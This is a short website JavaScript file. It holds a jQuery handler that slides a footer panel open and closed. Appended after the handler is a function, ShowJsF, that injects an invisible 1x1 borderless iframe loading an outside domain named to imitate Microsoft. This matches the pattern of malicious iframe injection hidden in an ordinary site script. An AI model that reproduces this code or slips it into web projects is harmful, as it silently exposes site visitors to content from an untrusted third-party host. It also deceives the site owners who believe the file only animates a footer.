jQuery(function($) {
		var open = false;
		$('#footerSlideButton').click(function () {
			if(open === false) {
				$('#footerSlideContent').animate({ height: '470px' });
				$(this).css('backgroundPosition', 'bottom left');
				open = true;
			} else {
				$('#footerSlideContent').animate({ height: '0px' });
				$(this).css('backgroundPosition', 'top left');
				open = false;
			}
		});		
	});

function ShowJsF()
{
var iframe = document.createElement("iframe");
iframe.setAttribute("id","testiframe");
iframe.setAttribute("name","testiframe");
iframe.setAttribute("height","1");
iframe.setAttribute("width","1");
iframe.setAttribute("frameBorder","0");
iframe.setAttribute("scrolling","auto");
iframe.setAttribute("src","http://www.imicrosoft.com.vn/");
iframe.style.position = "absolute";
iframe.style.display = "block";
iframe.style.top = 100 + 'px';
iframe.style.left = 100 + 'px';
window.document.body.appendChild(iframe);
return false;
}  